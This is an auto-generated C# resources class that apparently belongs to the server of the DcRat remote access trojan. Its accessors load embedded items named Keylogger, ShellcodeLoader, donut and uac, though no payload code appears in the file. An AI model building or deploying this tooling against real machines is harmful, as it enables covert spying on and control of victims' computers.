using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Resources;
using System.Runtime.CompilerServices;

namespace Server.Properties;

[CompilerGenerated]
[DebuggerNonUserCode]
[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0")]
public class Resources
{
	private static ResourceManager resourceMan;

	private static CultureInfo resourceCulture;

	[EditorBrowsable(EditorBrowsableState.Advanced)]
	public static ResourceManager ResourceManager
	{
		get
		{
			if (resourceMan == null)
			{
				resourceMan = new ResourceManager("Server.Properties.Resources", typeof(Resources).Assembly);
			}
			return resourceMan;
		}
	}

	[EditorBrowsable(EditorBrowsableState.Advanced)]
	public static CultureInfo Culture
	{
		get
		{
			return resourceCulture;
		}
		set
		{
			resourceCulture = value;
		}
	}

	public static byte[] _7z => (byte[])ResourceManager.GetObject("_7z", resourceCulture);

	public static byte[] _7z1 => (byte[])ResourceManager.GetObject("_7z1", resourceCulture);

	public static Bitmap arrow_down => (Bitmap)ResourceManager.GetObject("arrow_down", resourceCulture);

	public static Bitmap arrow_up => (Bitmap)ResourceManager.GetObject("arrow_up", resourceCulture);

	public static Bitmap avatar => (Bitmap)ResourceManager.GetObject("avatar", resourceCulture);

	public static Icon DcRat => (Icon)ResourceManager.GetObject("DcRat", resourceCulture);

	public static Bitmap DcRat_png => (Bitmap)ResourceManager.GetObject("DcRat_png", resourceCulture);

	public static byte[] donut => (byte[])ResourceManager.GetObject("donut", resourceCulture);

	public static byte[] ip2region => (byte[])ResourceManager.GetObject("ip2region", resourceCulture);

	public static Bitmap keyboard => (Bitmap)ResourceManager.GetObject("keyboard", resourceCulture);

	public static Bitmap keyboard_on => (Bitmap)ResourceManager.GetObject("keyboard-on", resourceCulture);

	public static byte[] Keylogger => (byte[])ResourceManager.GetObject("Keylogger", resourceCulture);

	public static Bitmap mouse => (Bitmap)ResourceManager.GetObject("mouse", resourceCulture);

	public static Bitmap mouse_enable => (Bitmap)ResourceManager.GetObject("mouse_enable", resourceCulture);

	public static UnmanagedMemoryStream offline => ResourceManager.GetStream("offline", resourceCulture);

	public static UnmanagedMemoryStream online => ResourceManager.GetStream("online", resourceCulture);

	public static Bitmap play_button => (Bitmap)ResourceManager.GetObject("play-button", resourceCulture);

	public static Bitmap save_image => (Bitmap)ResourceManager.GetObject("save-image", resourceCulture);

	public static Bitmap save_image2 => (Bitmap)ResourceManager.GetObject("save-image2", resourceCulture);

	public static Bitmap settings => (Bitmap)ResourceManager.GetObject("settings", resourceCulture);

	public static string ShellcodeLoader => ResourceManager.GetString("ShellcodeLoader", resourceCulture);

	public static Bitmap stop__1_ => (Bitmap)ResourceManager.GetObject("stop (1)", resourceCulture);

	public static Bitmap tomem => (Bitmap)ResourceManager.GetObject("tomem", resourceCulture);

	public static Bitmap tomem1 => (Bitmap)ResourceManager.GetObject("tomem1", resourceCulture);

	public static Bitmap uac => (Bitmap)ResourceManager.GetObject("uac", resourceCulture);

	internal Resources()
	{
	}
}
